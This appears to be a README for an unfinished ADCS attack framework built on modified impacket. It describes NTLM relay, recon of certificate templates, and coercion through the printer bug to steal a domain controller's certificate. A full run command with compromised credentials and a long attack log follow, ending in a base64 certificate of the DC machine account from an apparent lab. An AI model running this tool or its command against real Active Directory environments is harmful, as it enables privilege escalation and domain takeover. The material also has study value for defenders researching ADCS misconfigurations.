# ADCS_Attack_framework
Unfinished code for ADCS Attack / Recon


It works by modifying many impacket modules to perform the following tasks:

1) Set up an SMB Relay server (Modified NTLMRelayX)
2) Perform reconnaissance on certificate authorities & certificate templates.
3) Abuse the printer bug to coerce the DC into authenticating to our smbserver -> relay it to the ADCS Web Enrollment endpoint & grab a bas64 version of the DC's certificate.
4) It's supposed to also identify any certificate templates where we can submit our own subject (I.E. Domain Admin or other user) and apply for that certificate using a target subject. However, my setup couldn't get this to work. Abondoning the work here.

Resources:
https://posts.specterops.io/certified-pre-owned-d95910965cd2
https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf

There's also many resources i used to understand ldap queries and their returned values (this was a bit of a learning curve for me since I had never used impacket or python libraries to perform ldap queries).

The output for the certificate Template Recon is ESC1-4 based on the spectreops categories for privilege escalation in their whitepaper.

Example Usage:
.5 = ADCS Server w/ Web Enrollment Service enabled
.1 = Attacker machine
.10 = Target Domain Controller
user / password = compromised domain user / password
python3 modified_ntlmrelayx.py -t http://192.168.100.5/certsrv/certfnsh.asp --adcs --user bread --password P@ssw0rd --domain breadman.local --listener 192.168.100.1 --targetDC 192.168.100.10 -smb2support --dementor


Example Output:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client RPC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server

[*] Servers started, waiting for connections
[*] Printing all CA's for the domain:
[*] CA: WIN-M58Q8EKNKOV.breadman.local
[*] Enumerating:
[!] Execpetion 'S-1-5-21-3667737584-2395373626-2708658285-1108'
[*] Printing vulnerable certificate Templates:
[*] Vulnerable Cert: User_Exploit_PrivEsc1
[*] Escalation Paths: ['ESC1 DOMAIN USERS', 'ESC2 ANY Purpose DOMAIN USERS']
[*] Vulnerable Cert: Copy of User_Exploit_PrivEsc2
[*] Escalation Paths: ['ESC1 DOMAIN USERS', 'ESC2 ANY Purpose DOMAIN USERS']
[*] Vulnerable Cert: User_Exploit_PrivEsc3
[*] Escalation Paths: ['ESC3 DOMAIN USERS']
[*] Vulnerable Cert: User_Exploit_PrivEsc4
[*] Escalation Paths: ['ESC2 no EKU listed DOMAIN USERS', 'ESC4 DOMAIN USERS']
[*] Vulnerable Cert: User_Exploit_PrivEsc6
[*] Escalation Paths: ['ESC4 DOMAIN USERS']
[*] connecting to 192.168.100.10
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[*] SMBD-Thread-2: Connection from BREADMAN/WIN-SU9AJM7P7JP$@192.168.100.10 controlled, attacking target http://192.168.100.5
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.100.5 as BREADMAN/WIN-SU9AJM7P7JP$ SUCCEED
[*] SMBD-Thread-2: Connection from BREADMAN/WIN-SU9AJM7P7JP$@192.168.100.10 controlled, but there are no more targets left!
[*] SMBD-Thread-4: Connection from /@192.168.100.10 controlled, attacking target http://192.168.100.5
[-] Authenticating against http://192.168.100.5 as / FAILED
[*] SMBD-Thread-5: Connection from /@192.168.100.10 controlled, but there are no more targets left!
[*] Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked
[*] done!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user WIN-SU9AJM7P7JP$: 
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
